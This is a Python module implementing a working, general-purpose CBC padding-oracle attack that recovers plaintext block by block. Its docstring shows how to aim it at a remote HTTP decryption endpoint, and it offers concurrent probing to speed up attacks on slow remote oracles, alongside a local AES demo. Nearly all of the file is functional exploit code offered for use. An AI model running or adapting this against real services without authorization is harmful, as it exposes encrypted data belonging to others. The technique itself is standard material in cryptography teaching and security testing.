#!/usr/bin/env python3
"""cbc_padding_oracle.py — generic PKCS#7 padding-oracle attack against any
oracle that distinguishes "padding valid" from "padding invalid".

Usage
-----
Import the ``attack`` function and pass it:

* ``oracle(ct: bytes) -> bool`` — returns ``True`` iff the ciphertext decrypts
  to something with valid PKCS#7 padding.
* ``ct: bytes`` — full ciphertext including the IV as its first block.
* ``block_size: int`` — usually ``16`` for AES.

Example::

    import requests
    from cbc_padding_oracle import attack

    def oracle(ct: bytes) -> bool:
        r = requests.post("http://target/decrypt", data={"ct": ct.hex()})
        return r.status_code == 200

    iv_and_ct = bytes.fromhex("...")
    print(attack(oracle, iv_and_ct))

Or run as a script with a ``--demo`` flag to attack a local AES-CBC oracle
just to confirm the implementation works on your machine.
"""
from __future__ import annotations

import os
from concurrent.futures import ThreadPoolExecutor
from typing import Callable

Oracle = Callable[[bytes], bool]


def attack_block(
    oracle: Oracle,
    prev: bytes,
    target: bytes,
    bs: int,
    workers: int = 1,
) -> bytes:
    """Recover the plaintext of a single block ``target`` given the preceding
    block ``prev``. Pass ``workers > 1`` to probe the 256 candidates per byte
    concurrently — fastest gain against a slow remote oracle."""
    intermediate = bytearray(bs)

    def probe(forged: bytes) -> bool:
        return oracle(forged + target)

    for byte_index in range(bs - 1, -1, -1):
        pad = bs - byte_index
        prefix = bytearray(bs)
        for k in range(byte_index + 1, bs):
            prefix[k] = intermediate[k] ^ pad

        def make(guess: int) -> bytes:
            f = bytearray(prefix)
            f[byte_index] = guess
            return bytes(f)

        forged_set = [make(g) for g in range(256)]
        if workers > 1:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                results = list(ex.map(probe, forged_set))
        else:
            results = [probe(f) for f in forged_set]

        winner = None
        for guess, hit in enumerate(results):
            if not hit:
                continue
            if byte_index == bs - 1:
                # Disambiguate the spurious \x01-pad case by perturbing the
                # next byte and re-probing.
                check = bytearray(forged_set[guess])
                check[byte_index - 1] ^= 0x01
                if not oracle(bytes(check) + target):
                    continue
            winner = guess
            break

        if winner is None:
            raise RuntimeError(f"no candidate at byte {byte_index}")
        intermediate[byte_index] = winner ^ pad

    return bytes(p ^ i for p, i in zip(prev, intermediate))


def attack(oracle: Oracle, ct: bytes, bs: int = 16, workers: int = 1) -> bytes:
    """Recover the full plaintext. ``ct`` must include the IV as block 0."""
    if len(ct) % bs:
        raise ValueError("ciphertext length not a multiple of block size")
    blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
    pt = b""
    for i in range(1, len(blocks)):
        pt += attack_block(oracle, blocks[i - 1], blocks[i], bs, workers)
    return pt


def _demo() -> None:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

    key = os.urandom(16)
    iv = os.urandom(16)
    msg = b"squeamish ossifrage at dawn"
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(msg, 16))

    def oracle(blob: bytes) -> bool:
        try:
            unpad(AES.new(key, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]), 16)
            return True
        except ValueError:
            return False

    recovered = attack(oracle, iv + ct, 16)
    print(recovered)


if __name__ == "__main__":
    import sys
    if len(sys.argv) == 2 and sys.argv[1] == "--demo":
        _demo()
    else:
        sys.exit("Import the `attack` function from this module, or run with --demo.")
